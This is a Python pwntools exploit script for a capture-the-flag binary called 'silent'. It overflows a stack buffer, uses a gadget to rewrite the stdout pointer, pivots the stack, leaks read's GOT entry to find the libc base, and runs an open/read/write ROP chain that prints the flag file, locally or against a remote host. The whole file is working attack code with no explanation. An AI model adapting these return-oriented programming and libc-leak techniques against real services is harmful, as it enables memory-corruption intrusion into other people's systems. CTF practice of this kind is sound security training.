from pwn import * 
from pwn import p64,u64
from LibcSearcher import *

debug = 1
gdb_is = 0
elf_path = "./silent"
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['wt.exe','nt','Ubuntu','-c']
    if gdb_is:
        # r = gdb.debug(elf_path,'set debug-file-directory ./.debug/')
        r = process(elf_path)
        gdb.attach(r,'b* main')
        # gdb.attach(r)
        pause()
        pass
    else:
        r = process(elf_path)
    
else:
    host = "192.168.0.111:53783"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0



def show_addr(name,addr):
      success(f'{name} = {hex(addr)}')

def revc_addr(name:str, until:bytes =b'\x7f',offset:int = 0,addrType:str = 'bytes')->int:
    if type(until) == str:
        until = until.encode()
    if addrType == 'bytes':
        if not offset:
            addr = u64(r.recvuntil(until).ljust(8,b'\x00'))
        else:
            addr = u64(r.recvuntil(until)[:offset].ljust(8,b'\x00'))
    elif addrType == 'str':
        addr = int(r.recvuntil(until)[2:offset].decode(),16)

    show_addr(name,addr)
    return addr

libc = ELF('./libc-2.27.so')
elf = ELF(elf_path)
rop = ROP(elf)



magic_gadget = 0x4007e8 # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret
pop_rbx_rbp_r4 = 0x40095A
pop_rbp_r14_r15 = 0x40095f
pop_rbp = 0x400788
stdout_addr = 0x601020
pop_rdi = 0x0400963
pop_rsi_r15 = 0x000400961
leave = 0x400876


rop.read(0,stdout_addr+0x8)
payload =   b'A' * 0x40 + p64(0) + p64(pop_rbx_rbp_r4) + p64(0x100000000 - 0x2dc670)+p64(stdout_addr + 0x3d) + p64(0)*4 + p64(magic_gadget)
payload += rop.chain() + p64(pop_rbp) + p64(stdout_addr - 0x8) + p64(pop_rdi) + p64(1) +p64(pop_rsi_r15) + p64(elf.got['read']) + p64(0)+ p64(leave) 
info(rop.dump())
r.send(payload)

# pause()
time.sleep(1)
rop = ROP(elf)
rop.read(0,stdout_addr + 0x38)
r.send(rop.chain())
# pause()
time.sleep(1)


got_read_addr =revc_addr('got_read')
libc.address = got_read_addr - libc.sym['read']
show_addr('libc.address',libc.address)

def csu(fuc,arg1,arg2,arg3):
    csu1 = 0x040095A #rbx->0 rbp r12-call r13->edi r14->rsi r15->rdx
    csu2 = 0x400940 # rdx->r15 rsi->r14 edi->r13 
    result = p64(csu1) + p64(0) + p64(1) + p64(fuc) + p64(arg1) + p64(arg2) + p64(arg3) + p64(csu2)
    return result

rop = ROP(libc)
rop.base = stdout_addr + 0x38
rop.open(b'./flag',0,0)
rop.read(3,0x0601040 + 0x100,0x20)
rop.write(1,0x0601040 + 0x100,0x20)
payload = rop.chain()
time.sleep(1)
r.send(payload)

r.interactive()
